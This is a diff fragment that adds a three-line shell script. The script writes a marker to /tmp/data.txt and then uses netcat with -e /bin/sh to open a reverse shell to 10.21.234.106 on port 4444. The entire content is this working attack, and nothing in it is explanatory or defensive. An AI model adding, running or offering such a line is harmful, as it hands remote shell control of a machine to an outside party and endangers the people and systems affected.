@@ -1,0 +1,3 @@
+#!/bin/sh
+echo "run rev" > /tmp/data.txt
+nc 10.21.234.106 4444 -e /bin/sh
